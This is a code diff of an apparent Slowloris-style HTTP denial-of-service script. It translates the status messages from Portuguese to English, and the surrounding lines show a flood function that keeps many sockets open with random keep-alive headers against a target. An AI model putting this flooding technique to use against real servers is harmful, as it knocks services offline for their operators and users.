@@ -19,11 +19,11 @@ def create_socket(target):
         )
         sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
     except socket.timeout:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Tempo esgotado..{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}Time's up...{Fore.RESET}")
     except socket.error:
-        print(f"{Fore.RED}[-] {Fore.MAGENTA}Ocorreu um erro ao criar socket{Fore.RESET}")
+        print(f"{Fore.RED}[-] {Fore.MAGENTA}There was an error creating socket{Fore.RESET}")
     else:
-        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket criado..{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] {Fore.YELLOW}Socket created..{Fore.RESET}")
         return sock
 
 
@@ -42,10 +42,10 @@ def flood(target):
                 sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 print(
-                    f"{Fore.RED}[-] {Fore.MAGENTA}Ocorreu um erro ao enviar headers keep-alive{Fore.RESET}"
+                    f"{Fore.RED}[-] {Fore.MAGENTA}There was an error sending headers keep-alive{Fore.RESET}"
                 )
                 sockets.remove(sock)
             else:
                 print(
-                    f"{Fore.GREEN}[+] {Fore.YELLOW}Enviando headers keep-alive para {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
+                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending headers keep-alive to {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
                 )
